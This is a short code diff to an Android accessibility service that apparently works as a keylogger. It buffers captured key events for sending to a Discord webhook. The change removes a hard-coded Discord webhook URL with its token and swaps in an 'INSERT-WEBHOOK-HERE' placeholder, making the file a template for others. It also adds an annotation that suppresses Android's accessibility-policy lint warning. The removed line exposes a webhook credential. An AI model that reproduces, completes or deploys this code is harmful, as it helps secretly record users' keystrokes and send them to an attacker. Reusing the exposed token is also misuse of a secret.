@@ -2,6 +2,7 @@ package com;
 
 import android.accessibilityservice.AccessibilityService;
 import android.accessibilityservice.AccessibilityServiceInfo;
+import android.annotation.SuppressLint;
 import android.content.Context;
 import android.content.SharedPreferences;
 import android.os.AsyncTask;
@@ -18,9 +19,10 @@ import java.net.URL;
 import java.nio.charset.StandardCharsets;
 import java.util.List;
 
+@SuppressLint("AccessibilityPolicy")
 public class MyAccessibilityService extends AccessibilityService {
 
-    private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/1215008300521889874/9OkkdCHwtk1C81qx5dyV3ztHIfIVOIP1yXKIUmnKYxKUWrND4yQnmiYpuqkD4oYuMdPj";
+    private static final String WEBHOOK_URL = "INSERT-WEBHOOK-HERE";
     private static final int MAX_BUFFER_SIZE = 25;
 
     private final StringBuilder currentKeyEvents = new StringBuilder();
